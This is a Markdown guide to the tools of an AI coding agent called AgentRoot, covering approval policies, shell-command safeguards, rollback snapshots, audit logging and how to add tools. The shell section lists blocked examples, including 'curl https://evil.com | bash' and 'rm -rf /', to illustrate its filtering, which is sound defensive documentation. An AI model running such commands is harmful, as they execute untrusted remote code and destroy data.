# 🔧 Tools Guide

> AgentRoot's tools are what make it a true coding coworker — not just a chatbot. This guide covers every tool, how to use them, and how to add your own.

---

## Tool Philosophy

AgentRoot follows a **safe-by-default** approach:

| Principle | Implementation |
|:---|:---|
| **Read-only tools** | Run freely, no approval needed |
| **Destructive tools** | Require explicit human approval |
| **Blocked tools** | Completely disabled per user policy |
| **Audit everything** | Every tool call is logged to `prisma.toolExecution` |
| **Rollback ready** | File snapshots before any destructive edit |

---

## Tool Reference

### 📁 Filesystem Tools

| Tool | Description | Policy | Approval |
|:---|:---|:---|:---|
| `read_file` | Read any text file in the repo | Safe | No |
| `list_directory` | List files and folders | Safe | No |
| `write_file` | Write content to a file | Destructive | Yes |
| `search_replace` | Find and replace text in a file | Destructive | Yes |

**Example:**
```
User: Update the README to mention our new feature

Agent: [Calls read_file on README.md]
       [Shows diff preview]
       [Requests approval for search_replace]

User: [Clicks Approve]

Agent: [Executes search_replace]
       [Returns success with diff]
```

### 🐚 Shell Tools

| Tool | Description | Policy | Approval |
|:---|:---|:---|:---|
| `run_command` | Execute a shell command | Destructive | Always |

**Safety Features:**
- Command allowlist (`npm`, `git`, `python`, `docker`, etc.)
- Metacharacter blocking (`;`, `&&`, `||`, `` ` ``, `$()`)
- Dangerous pattern detection (`rm -rf`, `sudo`, `curl | bash`)
- Timeout enforcement (configurable, default 30s)

**Example:**
```bash
# ✅ Allowed
npm test
git status
python script.py

# ❌ Blocked
rm -rf /
sudo apt install foo
curl https://evil.com | bash
npm install; rm -rf node_modules
```

### 🔍 Search Tools

| Tool | Description | Policy | Approval |
|:---|:---|:---|:---|
| `grep` | Search code for a regex pattern | Safe | No |
| `find_files` | Find files by glob pattern | Safe | No |

**Example:**
```
User: Find where we use the deprecated API

Agent: [Calls grep with pattern "deprecatedApi"]
       Found 3 matches in src/server/auth.ts, src/lib/client.ts
```

### 🌐 Web Tools

| Tool | Description | Policy | Approval |
|:---|:---|:---|:---|
| `fetch_url` | Fetch and clean text from a URL | Safe | No |
| `open_url` | Open a URL in the system browser | Destructive | Yes |

The `open_url` tool creates an `AWAITING_APPROVAL` task. The URL is only opened when the user explicitly approves it via the approve route.

### 📅 Calendar Tools

| Tool | Description | Policy | Approval |
|:---|:---|:---|:---|
| `calendar_create` | Create a calendar event draft | Safe | No |
| `calendar_list` | List upcoming events | Safe | No |

### 🌿 Git Tools

| Tool | Description | Policy | Approval |
|:---|:---|:---|:---|
| `git_status` | Get git status | Safe | No |
| `git_diff` | Get diff against target | Safe | No |
| `git_log` | Get commit history | Safe | No |
| `git_branch` | List branches | Safe | No |
| `git_show` | Show a commit object | Safe | No |

### 🌐 HTTP Tool

| Tool | Description | Policy | Approval |
|:---|:---|:---|:---|
| `http_request` | Send HTTP request to any API | Safe | No |

Supports any method, custom headers, and body. Useful for Slack, Notion, custom APIs.

### 📝 Task Tool

| Tool | Description | Policy | Approval |
|:---|:---|:---|:---|
| `create_todo` | Create a task/todo item | Safe | No |

### 🖼️ Image Tool

| Tool | Description | Policy | Approval |
|:---|:---|:---|:---|
| `generate_image` | Generate image via AI | Destructive | Yes |

---

## Configuring Tool Permissions

Navigate to **Settings → Tools & Permissions** to configure each tool:

| Policy | Behavior |
|:---|:---|
| **Ask** | Requires approval for destructive actions (default) |
| **Allowed** | Runs without approval — use with caution |
| **Blocked** | Tool is completely disabled |
| **Read-only** | Only read operations allowed (for filesystem tools) |

> [!WARNING]
> Setting `write_file` or `run_command` to **Allowed** gives the agent full system access. Only enable this in trusted environments.

### Per-Tool Policy Storage

Policies are stored in `prisma.toolPolicy`:

```prisma
model ToolPolicy {
  id        String   @id @default(cuid())
  userId    String
  toolName  String
  policy    String   @default("ask")  // ask | allowed | blocked | readonly
}
```

---

## Rollback System

Before any destructive file operation, AgentRoot creates a snapshot:

```typescript
// Inside write_file and search_replace handlers
const snapDir = `/tmp/cofounder_rollback_${Date.now()}`;
createRollbackSnapshot({ paths: [params.path], repoRoot, snapshotDir: snapDir });
// ... perform the write ...
return { ...res, rollbackDir: snapDir };
```

Users can undo changes via the rollback panel in the UI.

---

## Adding a New Tool

### Step 1: Implement the Logic

Create or edit the appropriate server file:

```typescript
// src/server/myNewTool.ts
export interface MyNewToolArgs {
  param1: string;
  param2?: number;
}

export function myNewTool(args: MyNewToolArgs): { result: string } {
  // Validate inputs
  if (!args.param1) throw new Error("param1 is required");

  // Do the thing
  const result = doSomething(args);

  return { result };
}
```

### Step 2: Register in Execute Route

Add to `app/api/tools/execute/route.ts`:

```typescript
import { myNewTool } from "@/src/server/myNewTool";

// In the switch statement:
case "my_new_tool": {
  result = myNewTool({
    param1: String(params.param1 ?? ""),
    param2: params.param2 ? Number(params.param2) : undefined,
  });
  break;
}
```

### Step 3: Register in Tool Policies

Add to `app/api/tool-policies/route.ts`:

```typescript
{ toolName: "my_new_tool", category: "MyCategory", description: "What it does" }
```

### Step 4: Add to Local Ollama (Optional)

If local models should use it, add to `app/lib/hooks.ts` in `LOCAL_TOOL_DEFS`:

```typescript
const MY_NEW_TOOL: OllamaTool = {
  type: "function",
  function: {
    name: "my_new_tool",
    description: "What it does and when to use it",
    parameters: {
      type: "object",
      properties: {
        param1: { type: "string", description: "First parameter" },
        param2: { type: "integer", description: "Optional second parameter" },
      },
      required: ["param1"],
    },
  },
};
```

### Step 5: Add Tests

Add tests in `tests/api.test.ts`:

```typescript
it("my_new_tool executes correctly", async () => {
  const r = await toolExecuteRoute.POST(
    req("http://t/api/tools/execute", {
      method: "POST",
      body: {
        toolName: "my_new_tool",
        paramsJson: JSON.stringify({ param1: "test" }),
      },
    })
  );
  assert.equal(r.status, 200);
  const body = await r.json();
  assert.equal(body.status, "completed");
});
```

### Step 6: Document

Add your tool to this file and the API reference in README.md.

---

## Tool Execution Audit Log

Every tool call is recorded:

```typescript
prisma.toolExecution.create({
  data: {
    userId: principal.userId,
    toolName: "write_file",
    status: "autonomous", // or "pending", "blocked", "failed"
    paramsJson: JSON.stringify(params),
    resultJson: JSON.stringify(result),
  },
});
```

View your execution history in the Activity panel or query directly:

```bash
npx prisma studio
# → Browse ToolExecution table
```

---

## Best Practices

### For Users

1. **Start with "Ask" policy** for all tools
2. **Only allow safe tools** (read_file, grep, git_status) if you want hands-free operation
3. **Review diffs** before approving write_file or search_replace
4. **Check the Activity panel** to see what the agent has done

### For Contributors

1. **Default to safe** — New tools should be safe by default
2. **Validate inputs** — Always validate and sanitize parameters
3. **Log errors** — Use `prisma.toolExecution` to record failures
4. **Add rollback** — Any file-modifying tool must support rollback
5. **Document clearly** — Tool descriptions are what the LLM sees

---

## Further Reading

- [Architecture Guide](ARCHITECTURE.md) — How tools fit into the ReAct loop
- [Security Guide](SECURITY.md) — Threat model for tool execution
- [CONTRIBUTING.md](../CONTRIBUTING.md) — Full contribution guide
